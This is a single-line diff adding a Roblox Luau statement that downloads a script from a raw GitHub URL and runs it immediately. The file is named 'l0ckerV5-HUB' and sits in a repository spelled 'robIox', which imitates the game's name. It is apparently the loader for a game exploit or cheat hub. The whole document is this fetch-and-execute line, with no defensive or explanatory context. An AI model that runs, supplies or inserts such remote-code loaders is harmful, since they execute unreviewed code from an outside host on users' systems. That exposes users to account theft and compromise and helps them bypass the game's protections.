@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/l0ckerV5/robIox/main/l0ckerV5-HUB"))();
